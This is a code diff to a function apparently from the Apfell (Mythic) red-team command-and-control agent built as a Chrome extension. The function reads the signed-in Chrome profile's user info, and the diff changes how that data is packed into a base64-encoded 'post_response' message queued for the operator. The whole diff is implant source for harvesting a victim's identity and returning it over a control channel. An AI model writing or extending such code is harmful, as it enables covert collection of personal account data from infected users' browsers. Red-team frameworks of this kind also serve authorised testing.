@@ -1,17 +1,14 @@
-userinfo = function(params) {
-    let taskid = params['taskid'];
-    let tasktype = params['tasktype'];
+userinfo = function(task) {
     chrome.identity.getProfileUserInfo(function(info){
         if (info === undefined) {
-            sendError(taskid, tasktype);
+            sendError(task['task_id']);
         } else {
-            const data = btoa(unescape(encodeURIComponent((JSON.stringify(info, null, 2)))));
-            const apfellMsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
-            let meta = {};
-            meta["metatype"] = 3;
-            meta["metadata"] = apfellMsg;
-            const metaenvelope = JSON.stringify(meta);
-            out.push(metaenvelope);
+            response = {"task_id":task['task_id'], "user_output":JSON.stringify(info, null, 2), "completed": true};
+            outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
+            enc = JSON.stringify(outer_response);
+            final = apfell.apfellid + enc;
+            msg = btoa(unescape(encodeURIComponent(final)));
+            out.push(msg);
         }
     });
 };
